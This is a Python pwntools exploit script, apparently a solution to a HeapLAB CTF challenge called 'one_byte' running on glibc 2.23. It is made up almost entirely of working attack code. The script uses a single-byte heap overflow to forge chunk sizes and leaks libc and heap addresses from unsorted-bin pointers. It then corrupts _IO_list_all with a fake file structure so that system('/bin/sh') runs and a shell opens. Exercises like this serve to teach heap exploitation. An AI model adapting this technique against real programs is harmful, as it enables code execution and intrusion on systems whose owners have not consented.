#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

context.log_level = "debug"
gs = '''
set solib-search-path /home/huhu/CTF-writeups/pwn/heaplab/HeapLAB/.glibc/glibc_2.23
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request a chunk.
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()
# Edit chunk A.
edit(chunk_A, p64(0)*11 + p8(0xc1))
free(chunk_B)
chunk_B = malloc()

data = read(chunk_C)
unsortedbin_addr = u64(data[:8])
unsortedbin_offset = libc.sym.main_arena + 0x58
# Because you haven't leaked a libc address yet, libc.sym.<symbol name>
# will only print a symbol's offset, rather than its actual address.
#info(f"offset of puts() from start of GLIBC shared object: 0x{libc.sym.puts:02x}")
libc.address = unsortedbin_addr - unsortedbin_offset
log.info(f"libc @ 0x{libc.address:02x}")
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

leak = read(chunk_C)
heap = u64(leak[:8])
log.info(f"heap @ 0x{heap:02x}")
chunk_C2 = malloc()
chunk_A = malloc()
edit(chunk_A, p64(0)*11 + p8(0xc1))
free(chunk_B)
chunk_B = malloc()

edit(chunk_B, p64(0)*10 + b"/bin/sh\0" + p8(0xb1))
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all-0x10) + p64(1) + p64(2))

edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))
# =============================================================================

io.interactive()
